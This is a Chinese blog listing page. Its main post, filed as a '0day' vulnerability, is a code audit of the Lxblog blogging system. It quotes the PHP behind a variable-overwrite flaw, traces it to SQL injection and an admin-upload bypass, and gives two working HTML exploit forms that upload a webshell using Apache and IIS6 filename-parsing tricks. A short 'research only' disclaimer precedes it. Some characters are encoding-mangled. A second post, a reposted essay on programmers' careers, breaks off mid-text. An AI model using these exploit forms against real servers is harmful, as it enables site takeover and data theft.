<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Blog,L.N.,渗透测试,APT,代码审计,程序开发,网络安全,信息安全" />










<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/7/index.html">
<meta property="og:site_name" content="Hexo">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/7/"/>





  <title>Hexo</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description"></h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Startseite
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archiv
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/04/11/Lxblog代码审计之变量覆盖/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/04/11/Lxblog代码审计之变量覆盖/" itemprop="url">Lxblog代码审计之变量覆盖</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-04-11T11:18:52+08:00">
                2013-04-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/0day漏洞/" itemprop="url" rel="index">
                    <span itemprop="name">0day漏洞</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>废话：</strong><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">&nbsp;&nbsp;&nbsp;&nbsp;lxblog是<a href="http://www.phpwind.net开发的多人博客系统，现在好像已经停止更新了！" target="_blank" rel="noopener">www.phpwind.net开发的多人博客系统，现在好像已经停止更新了！</a>&nbsp;</span></p>
<p><strong>声明</strong><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">：&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">&nbsp;&nbsp;&nbsp;&nbsp;本文只做技术研究，请勿非法使用，一起后果与本人无关！&nbsp;</span></p>
<p><strong>正文：</strong><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">关键文件：/mod/ajax_mod.php&nbsp;</span></p>
<p>`if (!empty($_POST)) {&nbsp;</p>
<p>&nbsp;&nbsp;$_POST = Char_cv($_POST);&nbsp;</p>
<p>&nbsp;&nbsp;if ($db_charset != ’utf-8’) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;require_once(R_P.’mod/charset_mod.php’);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;foreach ($_POST as $key =&gt; $value) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${’utf8_’.$key} = $value;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${$key} = convert_charset(’utf-8’,$db_charset,$value);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>
<p>&nbsp;&nbsp;} else {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;foreach ($_POST as $key =&gt; $value) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${’utf8_’.$key} = ${$key} = $value; //变量覆盖了&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>
<p>&nbsp;&nbsp;}&nbsp;</p>
<p>}`</p>
<p><strong>变量覆盖导致注入漏洞</strong><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">重点文件：/ajax.php&nbsp;</span></p>
<p>`if ($action==’vote’) {&nbsp;</p>
<p>&nbsp;&nbsp;!$winduid &amp;&amp; exit(’not_login’);//变量覆盖绕过&nbsp;</p>
<p>&nbsp;&nbsp;(int)$votenum &lt; 1 &amp;&amp; exit(’erro_voteid’);//变量覆盖绕过&nbsp;</p>
<p>&nbsp;&nbsp;$voteitem = array();&nbsp;</p>
<p>&nbsp;&nbsp;$query = $db-&gt;query(“SELECT id,voteduid FROM pw_voteitem WHERE vid=’$vid’”);//漏洞来了，进入query()函数&nbsp;</p>
<p>&nbsp;&nbsp;while ($rt = $db-&gt;fetch_array($query)) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;strpos(“,$rt[voteduid],”,”,$winduid,”)!==false &amp;&amp; exit(’have_voted’);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$voteitem[$rt[’id’]] = $rt[’voteduid’];&nbsp;</p>
<p>&nbsp;&nbsp;}`</p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">漏洞文件:/mod/db_mysql.php&nbsp;</span></p>
<p>`function query($SQL,$method=’’){//覆盖?量 $GLOBALS[’PW’] 形成注入&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$GLOBALS[’PW’]!=’pw_’ &amp;&amp; $SQL = str_replace(’ pw_’,’ ’.$GLOBALS[’PW’],$SQL);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$query = ($method==’U_B’ &amp;&amp; function_exists(’mysql_unbuffered_query’)) ? @mysql_unbuffered_query($SQL) : @mysql_query($SQL);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;query_num++;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;!$query &amp;&amp; $this-&gt;halt(’Query Error: ’ . $SQL);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;return $query;&nbsp;</p>
<p>&nbsp;&nbsp;}`</p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">exp:&nbsp;</span></p>
<p><a href="http://zone.wooyun.org/upload/image/201304/2013040719130524302.jpg" title="1.jpg" target="_blank" rel="noopener"><img src="http://zone.wooyun.org/upload/image/201304/2013040719130524302.jpg" alt="1.jpg" title="1.jpg"></a><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">&nbsp;</span></p>
<p><strong>变量覆盖导致后台getshell</strong><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">重?文件：/ajaxadmin.php&nbsp;</span></p>
<p>`…..&nbsp;</p>
<p>require_once(R_P.’admin/admincp.php’);&nbsp;</p>
<p>require_once(R_P.’mod/ajax_mod.php’);//?量覆?了&nbsp;</p>
<p>….&nbsp;</p>
<p>} elseif ($action==’upload’) {&nbsp;</p>
<p>&nbsp;&nbsp;if ($job == ’add’) {&nbsp;</p>
<p>InitGP(array(’uid’,’mode’),’G’);//$uid=1.phtml.&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$db_uploadmaxsize = $_GET[’db_uploadmaxsize’];//db_uploadmaxsize=10000&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$db_uploadfiletype = $_GET[’db_uploadfiletype’];//db_uploadfiletype=aaa&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$db_attachnum = $_GET[’db_attachnum’];//db_attachnum=1&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;require_once(R_P.’mod/upload_mod.php’);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$uploaddb = UploadSQL($uid,0,0,’’,$mode);//?入上?，$mode=&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;foreach ($uploaddb as $value) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$aid = $value[’aid’];&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$name = $value[’name’];&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$size = $value[’size’];&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$desc = $value[’desc’];&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$url = “$attachpath/$value[attachurl]”;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;echo “&lt;script language=”JavaScript1.2”&gt;parent.UploadFileResponse(’$mode’,’$aid’,’$size’,’$desc’,’$name’,’$url’);&lt;/script&gt;”;exit;&nbsp;</p>
<p>&nbsp;&nbsp;}&nbsp;</p>
<p>……&nbsp;</p>
<p>function UploadSQL($uid,$itemid,$cid=0,$atype = null,$mode = null){&nbsp;</p>
<p>&nbsp;&nbsp;global $db,$attachdb,$timestamp,$atc_content;&nbsp;</p>
<p>&nbsp;&nbsp;$uploaddb = !empty($_FILES) ? UploadFile($uid,$mode) : array();//?入uploadfile函?&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;</p>
<p>……&nbsp;</p>
<p>function UploadFile($uid,$mode = null){&nbsp;</p>
<p>&nbsp;&nbsp;global $_GROUP,$db,$admin_uid,$db_attachnum,$db_uploadmaxsize,$db_uploadfiletype,$timestamp,$db_attachdir,$attachpath,$attachdir,$db_thumbifopen,$db_thumbwh;&nbsp;</p>
<p>&nbsp;&nbsp;$filedb = $attachdb = $descdb = array();&nbsp;</p>
<p>&nbsp;&nbsp;foreach ($_FILES as $key =&gt; $value) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$i = (int)substr($key,11);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;if (!empty($mode) &amp;&amp; $i != $mode) continue;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$tmp_name = is_array($value) ? $value[’tmp_name’] : ${$key};&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$descdb[$key] = Char_cv($_POST[’atc_desc’.$i]);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$tagdb[$key] = Char_cv($_POST[’atc_tags’.$i]);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$i &gt; 0 &amp;&amp; $i &lt;= $db_attachnum &amp;&amp; if_uploaded_file($tmp_name) &amp;&amp; $filedb[$key] = $value;</p>
<p>&nbsp;&nbsp;}&nbsp;</p>
<p>&nbsp;&nbsp;unset($_FILES);&nbsp;</p>
<p>&nbsp;&nbsp;foreach ($filedb as $key =&gt; $value) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$i = (int)substr($key,11);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;if (is_array($value)) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$atc_attachment = $value[’tmp_name’];&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$atc_attachment_name = $value[’name’];&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$atc_attachment_size = $value[’size’];&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;} else {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$atc_attachment = ${$key};&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$atc_attachment_name = ${$key.’_name’};&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$atc_attachment_size = ${$key.’_size’};&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$atc_attachment_size &gt; $db_uploadmaxsize &amp;&amp; Uploadmsg(’upload_size_error’,$i);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;@extract($db-&gt;get_one(“SELECT SUM(size) AS tsizes FROM pw_upload WHERE uid=’$admin_uid’”));&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$_GROUP[’uploadsize’] &amp;&amp; $tsizes &gt;= $_GROUP[’uploadsize’] &amp;&amp; Uploadmsg(’upload_size_limit’,$i);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$extdb = explode(’ ’,strtolower($db_uploadfiletype));&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$attach_ext = strtolower(substr(strrchr($atc_attachment_name,’.’),1));&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;(!$attach_ext || !N_InArray($attach_ext,$extdb)) &amp;&amp; Uploadmsg(’upload_type_error’,$i);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$attach_ext = preg_replace(“/(php|asp|jsp|cgi|fcgi|exe|pl|phtml|dll|asa|com|scr|inf)/i”,”scp_\1”,$attach_ext);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$randvar = substr(md5($timestamp+$i),10,15);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;$fileurl = “{$uid}_{$randvar}”;//上??接&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;if ($attachdir == R_P.$attachpath) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$savedir = ’’;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p>……`</p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">然後我?可?的webshell就上?上去了&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">exp:&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">适用于apache&nbsp;</span></p>
<p>`&lt;html&gt;&nbsp;</p>
<p>&lt;body&gt;&nbsp;</p>
<p>&lt;form action=”<a href="http://127.0.0.1/lxblog/ajaxadmin.php?action=upload&amp;job=add&amp;uid=1.phtml.&amp;mode=&amp;db_uploadmaxsize=10000&amp;db_uploadfiletype=aaa&amp;db_attachnum=1&quot;" target="_blank" rel="noopener">http://127.0.0.1/lxblog/ajaxadmin.php?action=upload&amp;job=add&amp;uid=1.phtml.&amp;mode=&amp;db_uploadmaxsize=10000&amp;db_uploadfiletype=aaa&amp;db_attachnum=1&quot;</a> method=”post”&nbsp;</p>
<p>enctype=”multipart/form-data”&gt;&nbsp;</p>
<p>&lt;label for=”attachments1”&gt;Filename:&lt;/label&gt;&nbsp;</p>
<p>&lt;input type=”file” name=”attachments1” id=”attachments1” /&gt;&nbsp;</p>
<p>&lt;br /&gt;&nbsp;</p>
<p>&lt;input type=”text” name=”admin_uid” value=”2” /&gt;&nbsp;</p>
<p>&lt;br /&gt;&nbsp;</p>
<p>&lt;input type=”text” name=”timestamp” value=”a” /&gt;&nbsp;</p>
<p>&lt;br /&gt;&nbsp;</p>
<p>&lt;input type=”text” name=”attachdir” value=”./“&gt;&nbsp;</p>
<p>&lt;br /&gt;&nbsp;</p>
<p>&lt;input type=”submit” name=”submit” value=”1.phtml._b923820dcc509a6.aaa” /&gt;&nbsp;</p>
<p>&lt;/form&gt;&nbsp;</p>
<p>&lt;/body&gt;&nbsp;</p>
<p>&lt;/html&gt;`</p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">适用于iis6.0&nbsp;</span></p>
<p>`&lt;html&gt;&nbsp;</p>
<p>&lt;body&gt;&nbsp;</p>
<p>&lt;form action=”<a href="http://127.0.0.1/lxblog/ajaxadmin.php?action=upload&amp;job=add&amp;uid=1.php;.&amp;mode=&amp;db_uploadmaxsize=10000&amp;db_uploadfiletype=aaa&amp;db_attachnum=1&quot;" target="_blank" rel="noopener">http://127.0.0.1/lxblog/ajaxadmin.php?action=upload&amp;job=add&amp;uid=1.php;.&amp;mode=&amp;db_uploadmaxsize=10000&amp;db_uploadfiletype=aaa&amp;db_attachnum=1&quot;</a> method=”post”&nbsp;</p>
<p>enctype=”multipart/form-data”&gt;&nbsp;</p>
<p>&lt;label for=”attachments1”&gt;Filename:&lt;/label&gt;&nbsp;</p>
<p>&lt;input type=”file” name=”attachments1” id=”attachments1” /&gt;&nbsp;</p>
<p>&lt;br /&gt;&nbsp;</p>
<p>&lt;input type=”text” name=”admin_uid” value=”2” /&gt;&nbsp;</p>
<p>&lt;br /&gt;&nbsp;</p>
<p>&lt;input type=”text” name=”timestamp” value=”a” /&gt;&nbsp;</p>
<p>&lt;br /&gt;&nbsp;</p>
<p>&lt;input type=”text” name=”attachdir” value=”./“&gt;&nbsp;</p>
<p>&lt;br /&gt;&nbsp;</p>
<p>&lt;input type=”submit” name=”submit” value=”1.php;._b923820dcc509a6.aaa” /&gt;&nbsp;</p>
<p>&lt;/form&gt;&nbsp;</p>
<p>&lt;/body&gt;&nbsp;</p>
<p>&lt;/html&gt;`</p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">都成功了：&nbsp;</span></p>
<p><a href="http://zone.wooyun.org/upload/image/201304/2013040719321044757.jpg" title="2.jpg" target="_blank" rel="noopener"><img src="http://zone.wooyun.org/upload/image/201304/2013040719321044757.jpg" alt="2.jpg" title="2.jpg"></a><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">最后的废话：&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">据说刚开的领域！&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">phpcms v9的补丁打的亮瞎了我的钛合金x眼！&nbsp;</span></p>
<p><a href="http://zone.wooyun.org/upload/image/201304/2013040719375275507.jpg" title="3.jpg" target="_blank" rel="noopener"><img src="http://zone.wooyun.org/upload/image/201304/2013040719375275507.jpg" alt="3.jpg" title="3.jpg"></a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/04/11/转-走出浮躁的泥沼/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/04/11/转-走出浮躁的泥沼/" itemprop="url">[转]走出浮躁的泥沼</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-04-11T11:15:35+08:00">
                2013-04-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/琐碎杂事/" itemprop="url" rel="index">
                    <span itemprop="name">琐碎杂事</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <div class="contents_info" style="margin:5px 0px 25px;padding:0px;text-align:center;background-color:transparent;position:relative;color:#404040;line-height:19px;font-family:verdana, Arial, Helvetica, sans-serif;">来源: Veda原型&nbsp;&nbsp;发布时间: 2012-11-27 17:47&nbsp;&nbsp;阅读: 5675 次&nbsp;&nbsp;推荐: 108&nbsp;&nbsp;&nbsp;<a href="http://www.nowamagic.net/librarys/veda/detail/2339" target="_blank" rel="noopener">原文链接</a>&nbsp;&nbsp;&nbsp;<a class="graylink" style="margin:0px;padding:0px;color:#1a64a2;">[收藏]</a>&nbsp;&nbsp;</div><br><div class="contents_main" style="margin:0px;padding:0px;font-size:14px;line-height:25px;color:#232323;font-family:verdana, Arial, Helvetica, sans-serif;"><div id="ArticleCnt" class="content_words" style="margin:0px 10px 0px 15px;padding:0px;line-height:28px;"><br><br>　　<strong>关于技术与工作</strong><br><br>　　我觉得，技术与工作最理想的结合状态是，自己能学习到新的技术，这些技术也能应用到工作中；工作的内容又不那么枯燥，都那么具有挑战性。<br><br>#### 　　程序员的工作首先应该是富有挑战性的<br><br>　　有这么一句名言：<br><br>&gt; 工作，它之所以成为工作，是因为你只需要工作而不需要思考。<br><br>　　你也许会对这句话有异议，但是大部分人和大部分工作确实是这样的。工厂员工在流水线上机械地组装，服务员每天重复着招待客人，厨师日复一日地烹制菜肴，等等。工作，就是人和机器之间的中间层，等到某一天机器人有这种功能了，人自然就不用工作了。<br><br>　　但是我觉得，如果你在工作中比别人多那么一点思考，也许你就会出类拔萃，程序员这份工作就是这样。我认为，程序员的工作首先应该是富有挑战性的。但是我见到很多国内的程序员，只是项目完了接着下一个项目，代码重复了一遍又一遍……也许知道代码有问题要重构，系统架构不好要改进，可是没那么多时间啊，天天加班干活，项目时间紧迫。就这么恶性循环，就应了那句话：你说你有5年工作经验，但在我眼里，你不过是将一年的工作经验重复了5年。<br><br>　　程序员的工作是富有挑战性的，但是这个是在国外，在国内，很少真的有程序员，能做到程序结伴，不断挑战新的高度。大多数是年轻的时候努力奋斗了几年，到后来，因为本方向的发展空间不是很大了，但是又不能跳转到其他的方向，怎么办呢，带几个新人吧，这样也有点领导的性质了。但是，有没有想过，大学研究生读了这么多年，工作写了这么多代码，突然有一天不写了，转做项目管理了。这也就是中国的IT的现状，工作几年之后大家都痛苦地抛弃了代码，抛弃了自己以前的很多代码积累。<br><br>#### 　　程序员的工作与赚钱<br><br>　　我们出去工作，说到底，最根本的目的就是赚钱。但是，我们不能因为赚钱，而丢弃自己的信仰。<br><br>　　先来来看看这个一个故事吧：<img src="http://pic001.cnblogs.com/images/2012/145819/2012111115451513.jpg" alt=""><br><br>　　照片上那个戴墨镜的哥们， 叫 Nicholas McGuire， 是兰州大学的客座教授。看到这个照片，和我一样，一定有无数多的问题， 我一个一个帮你问，然后解答吧。<br><br><em>   <strong>你可能会奇怪，这么郑重的场合， 他为什么戴墨镜？ 耍酷吗 ？</strong>
</em>   答：其实不是耍酷，Nicholas 其实是一个半盲人。<br><br><em>   <strong>别人都是西装，他为什么只有衬衣 ？耍酷吗？</strong>
</em>   答：其实不是耍酷， Nicholas 真的没有西装，他穿的那身，是他能找到的最好的衣服。<br><br><em>   <strong>他到兰州大学研究什么的？ 是研究戈壁生态， 还是沙漠治理，还是兰州拉面 ？</strong>
</em>   答：其实都不是，他研究开源的嵌入式实时操作系统??RTLinux， 以及与此相关的一切开源软件以及嵌入式系统，是&nbsp;<a href="http://www.rtlinuxfree.com/" target="_blank" rel="noopener">RTLinux</a>&nbsp;的内核代码管理员之一，不折不扣的高科技。<br><br><em>   <strong>他是兰州大学高薪聘请来的吗？</strong>
</em>   答：没有高薪，事实上，一直连薪水都没有，直到今年，才申请了一些。<br><br><em>   <strong>他是不是每年来兰州一两个月，就当是度假？</strong>
</em>   答：不是，他实实在在在兰州大学呆 10 个月， 只有 2 个月回德国老家度假。<br><br><em>   <strong>他是不是只这样做了 1 两年.</strong>
</em>   答: 不是，他从 2005 年开始，直到现在，一直这样。<br><br><em>   <strong>他图什么 ？</strong>
</em>   答:&nbsp;<strong>因为兰州大学有一个叫周庆国的老师以及小组， 不停地向 RTLinux 的内核提交代码。他去兰州大学，就是要和他们一起工作</strong>。<br><br><em>   <strong>兰州大学的学生英语如何？能和他一起工作吗？</strong>
</em>   答: 他和兰州大学的学生， 无论是生活都是开会还是写文档，通通遵循开源社区的标准， 用英语交流，木有问题。<br><br><em>   <strong>为什么选择兰州大学？</strong>
</em>   答：因为兰州大学有一个叫周庆国的老师以及小组， 不停地向 RTLinux 的内核提交代码。<br><br><em>   <strong>周庆国老师拿到过国家项目的资助吗？比如发展开源软件基金，红旗 linux 神马滴。</strong>
</em>   答：几乎没有，兰州地处西部，离北京很远，拿到项目很难，他能作的就是不停地研究代码，提交代码，向开源社区贡献代码。<br><br><em>   <strong>这个与赛灵思有神马关系？</strong>
